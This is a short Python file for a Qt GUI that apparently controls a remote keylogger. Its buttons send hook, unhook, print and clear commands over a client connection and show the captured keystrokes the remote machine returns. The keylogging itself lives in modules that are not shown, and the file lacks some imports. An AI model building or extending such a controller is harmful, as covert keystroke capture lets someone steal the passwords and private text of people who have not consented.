from keylogger_design import KeyloggerDesign
import global_variables as gv
import utils

class KeyloggerApp(KeyloggerDesign):
    def __init__(self):
        super().__init__()

    def on_btn_hook_click(self):
        utils.write(gv.client, "keylog_hook()")

    def on_btn_unhook_click(self):
        utils.write(gv.client, "keylog_unhook()")

    def on_btn_print_key_click(self):
        utils.write(gv.client, "keylog_print()")

        self.txt_result.setText(utils.read_str(gv.client))

    def on_btn_clear_click(self):
        utils.write(gv.client, "keylog_clear()")

        self.txt_result.setText("")

    def closeEvent(self, event):
        self.on_btn_unhook_click()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    keylogger_app = KeyloggerApp()
    keylogger_app.show()
    sys.exit(app.exec())
